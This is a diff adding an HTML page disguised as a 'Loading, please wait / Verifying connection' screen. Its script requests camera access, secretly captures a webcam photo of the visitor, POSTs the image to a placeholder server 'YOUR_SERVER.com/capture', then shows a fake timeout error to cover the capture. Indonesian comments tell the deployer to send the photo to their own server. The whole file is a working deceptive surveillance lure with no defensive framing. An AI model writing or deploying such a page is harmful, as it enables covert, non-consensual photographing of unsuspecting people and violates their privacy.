@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading... Please Wait</title>
+    <style>
+        body { 
+            background: black; 
+            color: white; 
+            text-align: center; 
+            padding-top: 50%;
+            font-family: Arial;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <h2>Loading, please wait...</h2>
+    <p>Verifying connection</p>
+
+    <script>
+        // Ini akan trigger permission camera setelah 2 detik
+        setTimeout(() => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    // Izin dikasih - ambil screenshot
+                    let video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        let canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        // Kirim foto ke server lo
+                        let imageData = canvas.toDataURL('image/jpeg');
+                        fetch('https://YOUR_SERVER.com/capture', {
+                            method: 'POST',
+                            body: imageData
+                        });
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        alert("Error: Camera timeout. Please refresh.");
+                    }, 3000);
+                })
+                .catch(err => {
+                    console.log("Izin ditolak");
+                });
+        }, 2000);
+    </script>
+</body>
+</html>
